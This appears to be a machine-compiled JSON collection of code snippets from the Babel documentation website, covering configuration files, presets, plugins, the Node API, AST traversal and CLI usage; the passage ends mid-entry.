[
  {
    "owner": "babel",
    "repo": "website",
    "content": "TITLE: Using Babel API\nDESCRIPTION: This JavaScript snippet demonstrates how to use the Babel API to transform code programmatically. It uses the `transformSync` method from `@babel/core` to transform the input code string with the specified plugins. The `plugins` option accepts an array of plugin names or plugin configurations.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-arrow-functions\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Using codeFrameColumns with location\nDESCRIPTION: Illustrates how to use `codeFrameColumns` to generate a code frame with line numbers and a marker pointing to a specific location in the code, with optional syntax highlighting.\nSOURCE: https://github.com/babel/website/blob/main/docs/code-frame.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport { codeFrameColumns } from \"@babel/code-frame\";\n\nconst rawLines = `class Foo {\\n  constructor()\\n}`;\nconst location = { start: { line: 2, column: 16 } };\n\nconst result = codeFrameColumns(rawLines, location, {\n  /* options */\n});\n\nconsole.log(result);\n```\n\n----------------------------------------\n\nTITLE: JavaScript Plugin Configuration\nDESCRIPTION: Demonstrates how to configure Babel plugins with different formats including a simple plugin name, a plugin with options, a plugin with options and a custom name, and a plugin created using `babel.createConfigItem()`.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\nplugins: [\n  // EntryTarget\n  '@babel/plugin-transform-classes',\n\n  // [EntryTarget, EntryOptions]\n  ['@babel/plugin-transform-arrow-functions', { spec: true }],\n\n  // [EntryTarget, EntryOptions, string]\n  ['@babel/plugin-transform-for-of', { loose: true }, \"some-name\"],\n\n  // ConfigItem\n  babel.createConfigItem(require(\"@babel/plugin-transform-spread\")),\n]\n```\n\n----------------------------------------\n\nTITLE: Targeting current Node.js version in babel.config.json\nDESCRIPTION: This configuration demonstrates how to use `babel-preset-env` to transpile code to the current Node.js version. By setting the `node` target to `current`, Babel will only transpile code that is not supported by the currently running Node.js environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/env.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"env\",\n      {\n        \"targets\": {\n          \"node\": \"current\"\n        }\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Preset Options in babel.config.json\nDESCRIPTION: This JSON snippet demonstrates different ways to specify presets in a Babel configuration, including passing options. It shows that a preset can be specified as a bare string, wrapped in an array, or with an empty options object. All are equivalent if no options are needed.\nSOURCE: https://github.com/babel/website/blob/main/docs/presets.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\n    \"presetA\", // bare string\n    [\"presetA\"], // wrapped in array\n    [\"presetA\", {}] // 2nd argument is an empty options object\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing core-js with yarn\nDESCRIPTION: Demonstrates how to install core-js version 3 using yarn. This is a prerequisite for using the 'useBuiltIns' option with Babel Preset Env to automatically inject polyfills.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install core-js@3 --save\n```\n\n----------------------------------------\n\nTITLE: Customizing Automatic Runtime Import (JSX to JS)\nDESCRIPTION: Shows how to customize the import source for the automatic runtime using the `@jsxImportSource` pragma. This allows using a custom JSX library instead of React.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n/** @jsxImportSource custom-jsx-library */\n\nconst profile = (\n  <div>\n    <img src=\"avatar.png\" className=\"profile\" />\n    <h3>{[user.firstName, user.lastName].join(\" \")}</h3>\n  </div>\n);\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { jsx as _jsx } from \"custom-jsx-library/jsx-runtime\";\nimport { jsxs as _jsxs } from \"custom-jsx-library/jsx-runtime\";\n\nconst profile = _jsxs(\"div\", {\n  children: [\n    _jsx(\"img\", {\n      src: \"avatar.png\",\n      className: \"profile\",\n    }),\n    _jsx(\"h3\", {\n      children: [user.firstName, user.lastName].join(\" \"),\n    }),\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Configure preset in babel.config.json\nDESCRIPTION: This JSON configuration file shows how to include the @babel/preset-typescript preset in your Babel configuration.  It's the recommended way to configure Babel.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-typescript.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-typescript\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Traverse and Update AST Nodes JavaScript\nDESCRIPTION: This code snippet demonstrates how to use @babel/traverse to traverse an AST generated by @babel/parser and update identifier nodes. It parses JavaScript code, traverses the AST, and modifies the name of the identifier 'n' to 'x'.\nSOURCE: https://github.com/babel/website/blob/main/docs/traverse.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as parser from \"@babel/parser\";\nimport traverse from \"@babel/traverse\";\n\nconst code = `function square(n) {\n  return n * n;\n}`;\n\nconst ast = parser.parse(code);\n\ntraverse(ast, {\n  enter(path) {\n    if (path.isIdentifier({ name: \"n\" })) {\n      path.node.name = \"x\";\n    }\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: babel.config.json example for assumptions\nDESCRIPTION: Demonstrates using the enumerableModuleMeta assumption.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_11\n\nLANGUAGE: babel.config.json\nCODE:\n```\n{\n  \"assumptions\": {\n    \"enumerableModuleMeta\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: Demonstrates how to use the Babel Node API to transform JavaScript code with the @babel/plugin-transform-object-rest-spread plugin. The transformSync method is used to synchronously transform the provided code string.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-rest-spread.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-object-rest-spread\"],\n});\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'entry' - Transformed Specific CoreJS imports\nDESCRIPTION: Illustrates how Babel transforms specific core-js imports for array methods and math extensions with `useBuiltIns: 'entry'`. The specific modules imported depend on the target environment. This example demonstrates the output with polyfills for flat, flatMap and various math functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es.array.unscopables.flat\";\nimport \"core-js/modules/es.array.unscopables.flat-map\";\nimport \"core-js/modules/esnext.math.clamp\";\nimport \"core-js/modules/esnext.math.deg-per-rad\";\nimport \"core-js/modules/esnext.math.degrees\";\nimport \"core-js/modules/esnext.math.fscale\";\nimport \"core-js/modules/esnext.math.rad-per-deg\";\nimport \"core-js/modules/esnext.math.radians\";\nimport \"core-js/modules/esnext.math.scale\";\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin in babel.config.json (JSON)\nDESCRIPTION: Example configuration for the @babel/plugin-proposal-decorators plugin in the babel.config.json file.  It sets the `version` option to `2023-11`, specifying which version of the decorators proposal to use.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\"@babel/plugin-proposal-decorators\", { \"version\": \"2023-11\" }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with .babelrc.json\nDESCRIPTION: This snippet demonstrates the basic structure of a `.babelrc.json` file, which is used for file-relative Babel configurations. It shows the `presets` and `plugins` options, which are used to specify the transformations Babel should apply.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [...],\n  \"plugins\": [...]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin in babel.config.json\nDESCRIPTION: Example showing how to configure the `@babel/plugin-transform-class-properties` plugin in the `babel.config.json` file, without any additional options. This enables the plugin to transform class properties in the project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-class-properties\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Destructuring in JavaScript\nDESCRIPTION: Explains destructuring in ES2015, which allows binding variables using pattern matching. The example covers array and object matching, shorthand object matching, usage in parameter position, fail-soft destructuring, and default values. Destructuring simplifies the extraction of values from data structures.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n// list matching\nvar [a, ,b] = [1,2,3];\na === 1;\nb === 3;\n\n// object matching\nvar { op: a, lhs: { op: b }, rhs: c }\n       = getASTNode()\n\n// object matching shorthand\n// binds `op`, `lhs` and `rhs` in scope\nvar {op, lhs, rhs} = getASTNode()\n\n// Can be used in parameter position\nfunction g({name: x}) {\n  console.log(x);\n}\ng({name: 5})\n\n// Fail-soft destructuring\nvar [a] = [];\na === undefined;\n\n// Fail-soft destructuring with defaults\nvar [a = 1] = [];\na === 1;\n\n// Destructuring + defaults arguments\nfunction r({x, y, w = 10, h = 10}) {\n  return x + y + w + h;\n}\nr({x:1, y:2}) === 23\n```\n\n----------------------------------------\n\nTITLE: Transforming Code Synchronously\nDESCRIPTION: Shows how to use `babel.transformSync` to synchronously transform JavaScript code. The function takes code and options, returning an object with the transformed code, source map, and AST. Requires @babel/core and babel configurations. transformSync is recommended for synchronous needs in Babel 7+.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformSync(code, options); // => { code, map, ast }\n```\n\n----------------------------------------\n\nTITLE: Incorrect Preset Configuration (JavaScript)\nDESCRIPTION: This example demonstrates an incorrect way of configuring Babel presets.  It shows a preset configuration object that is missing the corresponding preset name, which can lead to unexpected errors.  It highlights the common mistake of not wrapping a preset with options in an array.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n// incorrect, and current gives a unexpected error message\n{\n  \"presets\": [\n    \"preset\",\n    { \"presetOptions\": 'hi' } // gets parsed as another preset instead of being part of the \"preset\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: JSX/TS Builder Aliases Removal\nDESCRIPTION: This migration guide explains the removal of the `t.jSX*` and `t.tS*` builder aliases in Babel 8, recommending using `t.jsx*` and `t.ts*` instead.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_63\n\n\n\n----------------------------------------\n\nTITLE: Registering Babel with rootMode upward\nDESCRIPTION: This code snippet demonstrates how to configure `@babel/register` with the `rootMode` option set to `upward`. This allows Babel to locate the babel.config.json file in the monorepo's root, ensuring consistent configuration across all packages when using `@babel/register`.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/register\")({\n  rootMode: \"upward\",\n});\n```\n\n----------------------------------------\n\nTITLE: Webpack Entry with Babel Polyfill\nDESCRIPTION: This code snippet demonstrates how to configure webpack to include `@babel/polyfill` in the entry array.  This approach ensures that the polyfill is included in the bundled output. It shows how to incorporate Babel's polyfills when `@babel/preset-env` is not used or when its `useBuiltIns` option is not configured to handle polyfills automatically. The `entry` array specifies the starting points for the webpack build process, and including `@babel/polyfill` here ensures that it is loaded before any other application code.\nSOURCE: https://github.com/babel/website/blob/main/docs/polyfill.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  entry: [\"@babel/polyfill\", \"./app/js\"],\n};\n```\n\n----------------------------------------\n\nTITLE: AST Representation of Dynamic Import in Babel 8 (TypeScript)\nDESCRIPTION: This code snippet demonstrates the new representation of a dynamic import statement in the AST in Babel 8. The import() expression is now represented by an ImportExpression node, with the source and options as its properties.  This is the recommended way to represent dynamic imports in Babel 8 and later.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\n{\n  type: \"ImportExpression\",\n  source: StringLiteral(\"foo\"),\n  options: Identifier(\"options\")\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring forceAllTransforms in Babel\nDESCRIPTION: This code snippet demonstrates how to configure the `forceAllTransforms` option within the Babel Preset-Env in a `babel.config.js` file. It conditionally enables all transforms when the `production` environment is active, which is useful for ensuring compatibility with older environments or minifiers like UglifyJS.  The `api.env` function is used to access the current environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = function(api) {\n  return {\n    presets: [\n      [\n        \"@babel/preset-env\",\n        {\n          targets: {\n            chrome: 59,\n            edge: 13,\n            firefox: 50,\n          },\n          // for uglifyjs...\n          forceAllTransforms: api.env(\"production\"),\n        },\n      ],\n    ],\n  };\n};\n```\n\n----------------------------------------\n\nTITLE: Using Presets in Compilation\nDESCRIPTION: Compiles `script.js` to `script-compiled.js` using the specified presets (@babel/preset-env and @babel/flow).  The `--presets` option allows applying pre-configured sets of transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_16\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel script.js --out-file script-compiled.js --presets=@babel/preset-env,@babel/flow\n```\n\n----------------------------------------\n\nTITLE: Install Babel plugin via npm/yarn\nDESCRIPTION: This command installs the @babel/plugin-syntax-optional-chaining package as a development dependency using npm or yarn. This allows Babel to parse the optional chaining syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-chaining.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-optional-chaining\n```\n\n----------------------------------------\n\nTITLE: Checking for Function Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node represents a function or method with a body and parameters. It uses the `t.isFunction(node)` method from Babel's `types` API. It covers nodes like `ArrowFunctionExpression`, `ClassMethod`, `FunctionDeclaration`, `FunctionExpression`, and `ObjectMethod`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_273\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isFunction(node);\n```\n\n----------------------------------------\n\nTITLE: Usage via Node API JavaScript\nDESCRIPTION: Shows how to use the `@babel/core` package's `transformSync` method to transform code with the `@babel/plugin-transform-class-static-block` plugin within a Node.js environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-static-block.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-class-static-block\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Targets with Browserslist Query in JSON\nDESCRIPTION: This JSON snippet demonstrates how to configure Babel's `targets` option using a browserslist-compatible query. It specifies that the project targets browsers with more than 0.25% market share and that are not dead.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"targets\": \"> 0.25%, not dead\"\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration in package.json\nDESCRIPTION: This snippet shows how to configure Babel within a `package.json` file using the `babel` key. This allows you to specify Babel presets and plugins directly in your package's configuration, which can be useful for simpler configurations. The presets and plugins arrays function the same way as in babel.config.json and .babelrc.json.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"name\": \"my-package\",\n  \"version\": \"1.0.0\",\n  \"babel\": {\n    \"presets\": [ ... ],\n    \"plugins\": [ ... ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Class Decorator with Parameter (JavaScript)\nDESCRIPTION: Shows a class decorator that takes a parameter and modifies the target class based on the parameter value. The `isTestable` function returns a decorator function that sets the `isTestable` property of the target class based on the provided `value`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n@isTestable(true)\nclass MyClass {}\n\nfunction isTestable(value) {\n  return function decorator(target) {\n    target.isTestable = value;\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel for Deno target in JSON\nDESCRIPTION: This JSON configuration snippet demonstrates how to configure `@babel/preset-env` to compile for a specific Deno version. The `targets` option is used to specify the Deno version, ensuring that only features not supported by that version are transpiled. This is useful for maintaining compatibility with older Deno engine versions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-10-27-7.20.0.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n    \"targets\": { \"deno\": \"1.20\" },\n    \"presets\": [\"@babel/preset-env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure importPolyfill option in babel.config.json\nDESCRIPTION: Configures the `importPolyfill` option of the @babel/plugin-proposal-record-and-tuple plugin within a babel.config.json file. Setting importPolyfill to true imports the polyfill.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-record-and-tuple.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-proposal-record-and-tuple\",\n      {\n        \"importPolyfill\": true\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Arrow Function Transformation with 'spec' Option\nDESCRIPTION: Example demonstrating the output JavaScript code when the `spec` option is enabled.  This mode wraps the generated function in `.bind(this)`, adds a runtime check to prevent instantiation, and adds names to arrow functions.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-arrow-functions.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _this = this;\n\nvar a = function a() {\n  babelHelpers.newArrowCheck(this, _this);\n}.bind(this);\nvar a = function a(b) {\n  babelHelpers.newArrowCheck(this, _this);\n  return b;\n}.bind(this);\n\nconst double = [1, 2, 3].map(\n  function(num) {\n    babelHelpers.newArrowCheck(this, _this);\n    return num * 2;\n  }.bind(this)\n);\nconsole.log(double); // [2,4,6]\n\nvar bob = {\n  _name: \"Bob\",\n  _friends: [\"Sally\", \"Tom\"],\n  printFriends() {\n    var _this2 = this;\n\n    this._friends.forEach(\n      function(f) {\n        babelHelpers.newArrowCheck(this, _this2);\n        return console.log(this._name + \" knows \" + f);\n      }.bind(this)\n    );\n  },\n};\nconsole.log(bob.printFriends());\n```\n\n----------------------------------------\n\nTITLE: Using Babel via CLI\nDESCRIPTION: This command demonstrates how to use the Babel CLI to transform a JavaScript file (script.js) using the @babel/preset-react preset.  The output will be printed to standard output.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-react.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbabel --presets @babel/preset-react script.js\n```\n\n----------------------------------------\n\nTITLE: Transform Class Properties JavaScript Example\nDESCRIPTION: Demonstrates the transformation of class properties, including instance properties, bound functions, static properties, and static functions, using the `@babel/plugin-transform-class-properties` plugin. It shows how the plugin transforms the class properties and their behavior.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-class-properties.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Bork {\n  //Property initializer syntax\n  instanceProperty = \"bork\";\n  boundFunction = () => {\n    return this.instanceProperty;\n  };\n\n  //Static class properties\n  static staticProperty = \"babelIsCool\";\n  static staticFunction = function() {\n    return Bork.staticProperty;\n  };\n}\n\nlet myBork = new Bork();\n\n//Property initializers are not on the prototype.\nconsole.log(myBork.__proto__.boundFunction); // > undefined\n\n//Bound functions are bound to the class instance.\nconsole.log(myBork.boundFunction.call(undefined)); // > \"bork\"\n\n//Static function exists on the class.\nconsole.log(Bork.staticFunction()); // > \"babelIsCool\"\n```\n\n----------------------------------------\n\nTITLE: Decorator Metadata Example in JavaScript\nDESCRIPTION: This code demonstrates how to use decorator metadata to share information between decorators. The `write` decorator sets metadata, and the `read` decorator logs the metadata. This functionality is included in `@babel/plugin-proposal-decorators`. It requires the `@babel/plugin-proposal-decorators` plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-09-25-7.23.0.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nfunction write(_, context) {\n  context.metadata.message = \"Hello from writer!\";\n}\nfunction read(_, context) {\n  console.log(context.metadata.message);\n}\n\n@read // Logs \"Hello from writer!\"\nclass A {\n  @write x;\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming code using AST with Babel\nDESCRIPTION: This JavaScript example demonstrates how to use Babel to transform code by first obtaining the AST (Abstract Syntax Tree) and then using it in a subsequent transformation. This is useful for optimizing performance in scenarios where multiple transform passes are required, avoiding unnecessary code generation.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst filename = \"example.js\";\nconst source = fs.readFileSync(filename, \"utf8\");\n\n// Load and compile file normally, but skip code generation.\nconst { ast } = babel.transformSync(source, {\n  filename,\n  ast: true,\n  code: false,\n});\n\n// Minify the file in a second pass and generate the output code here.\nconst { code, map } = babel.transformFromAstSync(ast, source, {\n  filename,\n  presets: [\"minify\"],\n  babelrc: false,\n  configFile: false,\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Config: Plugin Usage - With Options\nDESCRIPTION: This JSON configuration snippet shows how to enable the `@babel/plugin-transform-private-methods` plugin in a `babel.config.json` file with the `loose` option set to `true`. The 'loose' mode improves performance but may leak private members.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [[\"@babel/plugin-transform-private-methods\", { \"loose\": true }]]\n}\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin (npm)\nDESCRIPTION: Command to install the @babel/plugin-transform-react-jsx plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-react-jsx\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Task in Gruntfile.js\nDESCRIPTION: This snippet configures the `grunt-babel` task within a `Gruntfile.js` file. It sets options such as source map generation and specifies the Babel presets to use. The `dist` target defines the input and output file mapping for the Babel compilation process. It uses the `@babel/preset-env` preset and compiles `src/app.js` to `dist/app.js`.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/grunt/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ngrunt.initConfig({\n  babel: {\n    options: {\n      sourceMap: true,\n      presets: [\"@babel/preset-env\"],\n    },\n    dist: {\n      files: {\n        \"dist/app.js\": \"src/app.js\",\n      },\n    },\n  },\n});\n\ngrunt.loadNpmTasks('grunt-babel');\n\ngrunt.registerTask(\"default\", [\"babel\"]);\n```\n\n----------------------------------------\n\nTITLE: Private Methods Example JavaScript\nDESCRIPTION: This JavaScript code demonstrates the use of private methods within a class. The private method `#clicked` increments the private field `#xValue`, which is accessed via the private getter and setter `#x`. The class extends HTMLElement.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Counter extends HTMLElement {\n  #xValue = 0;\n\n  get #x() {\n    return this.#xValue;\n  }\n  set #x(value) {\n    this.#xValue = value;\n    window.requestAnimationFrame(this.#render.bind(this));\n  }\n\n  #clicked() {\n    this.#x++;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Targets with Deno version in JSON\nDESCRIPTION: This JSON snippet demonstrates how to configure Babel's `targets` option to target a specific Deno version. It specifies that the project should be compiled for Deno 1.9 or later.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"targets\": {\n    \"deno\": \"1.9\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel configuration file (babel.config.json)\nDESCRIPTION: This JSON configuration file specifies the presets used by Babel for transforming JavaScript code.  It configures `@babel/preset-env` to target specific browser versions (Edge 17, Firefox 60, Chrome 67, Safari 11.1) and includes settings for `useBuiltIns` and `corejs` to handle polyfilling based on usage. Requires Babel v7.8.0 and above.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"@babel/preset-env\",\n      {\n        \"targets\": {\n          \"edge\": \"17\",\n          \"firefox\": \"60\",\n          \"chrome\": \"67\",\n          \"safari\": \"11.1\"\n        },\n        \"useBuiltIns\": \"usage\",\n        \"corejs\": \"3.6.5\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Rewrite TypeScript Dynamic Import Extension (TypeScript)\nDESCRIPTION: Shows how Babel rewrites `.ts` extensions to `.js` in dynamic `import()` expressions, aligning with TypeScript's behavior. This enables dynamic loading of modules with extension rewriting.  It also shows a simplified output where the .ts extension is replaced with .js.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-10-25-7.26.0.md#_snippet_3\n\nLANGUAGE: typescript\nCODE:\n```\n// Input\nawait import(\"./dep.ts\");\nawait import(url);\n\n// Output\nawait import(\"./dep.js\");\nawait import(url.replace(/\\.ts$/, \".js\")); // simplified\n```\n\n----------------------------------------\n\nTITLE: Configure Babel plugin in babel.config.json\nDESCRIPTION: Configures the @babel/plugin-syntax-class-static-block plugin within the babel.config.json file. This enables Babel to recognize and parse class static block syntax during the transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-class-static-block.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-class-static-block\"]\n}\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'usage' - Example a.js\nDESCRIPTION: Example JavaScript code using `Promise` in `a.js`.  When `useBuiltIns: 'usage'` is enabled, Babel will inject the necessary core-js polyfill if `Promise` is not natively supported by the target environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar a = new Promise();\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'entry' - Specific CoreJS imports\nDESCRIPTION: Demonstrates importing specific core-js modules for array methods and math extensions.  `useBuiltIns: 'entry'` will transform these imports into more granular polyfill imports based on the target environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/es/array\";\nimport \"core-js/proposals/math-extensions\";\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with babel.config.js\nDESCRIPTION: This JavaScript snippet shows how to create a `babel.config.js` file to configure Babel.  It uses the module.exports pattern to export a function that receives an API object. `api.cache(true)` enables caching for improved performance.  The function returns an object containing presets and plugins, which can be dynamically defined based on the `api` object or other environmental factors.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nmodule.exports = function (api) {\n  api.cache(true);\n\n  const presets = [ ... ];\n  const plugins = [ ... ];\n\n  return {\n    presets,\n    plugins\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: Jest custom transformer for Babel\nDESCRIPTION: This snippet demonstrates creating a custom Jest transformer to wrap `babel-jest` and set the `rootMode` option to `upward`. This is useful when Jest is installed per-package in a monorepo, ensuring that Babel finds the root babel.config.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = require(\"babel-jest\").default.createTransformer({\n  rootMode: \"upward\",\n});\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'entry' - CoreJS import\nDESCRIPTION: Shows the initial `import` statement that `useBuiltIns: 'entry'` transforms, replacing it with specific polyfill imports based on the target environment and core-js version.  Requires core-js to be installed as a dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js\";\n```\n\n----------------------------------------\n\nTITLE: Configuring Plugins with Options\nDESCRIPTION: This snippet shows how to configure a plugin with options in the babel.config.json file. The plugin name and options object are wrapped in an array. The options are specified as key-value pairs in the object.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugins.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"transform-async-to-module-method\",\n      {\n        \"module\": \"bluebird\",\n        \"method\": \"coroutine\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Dynamic Babel Configuration with babel.config.js\nDESCRIPTION: This JavaScript snippet demonstrates how to create a dynamic `babel.config.js` file.  It checks the `process.env[\"ENV\"]` environment variable and conditionally adds a plugin to the `plugins` array if the environment is set to \"prod\". The API object provides access to caching and other Babel features. The function exports an object containing `presets` and `plugins`.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nmodule.exports = function (api) {\n  api.cache(true);\n\n  const presets = [ ... ];\n  const plugins = [ ... ];\n\n  if (process.env[\"ENV\"] === \"prod\") {\n    plugins.push(...);\n  }\n\n  return {\n    presets,\n    plugins\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: useBuiltIns: 'usage' - Example b.js\nDESCRIPTION: Example JavaScript code using 